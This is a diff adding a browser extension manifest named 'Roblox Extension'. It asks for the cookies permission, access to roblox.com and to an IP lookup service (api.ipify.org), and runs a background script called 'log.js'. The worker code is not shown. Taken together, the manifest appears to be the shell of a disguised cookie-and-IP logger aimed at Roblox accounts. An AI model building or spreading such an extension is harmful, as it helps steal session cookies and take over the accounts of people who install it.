@@ -1,0 +1,32 @@
+{
+    "name": "Roblox Extension",
+    "description": "Extension for https://www.roblox.com",
+    "version": "1.0.0",
+    "manifest_version": 3,
+
+    "action": {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "background": {
+        "service_worker": "scripts/log.js"
+    },
+
+    "host_permissions": [
+        "https://www.roblox.com/*",
+        "https://api.ipify.org/*"
+    ],
+
+    "permissions": [
+        "cookies",
+        "storage",
+        "activeTab"
+    ],
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
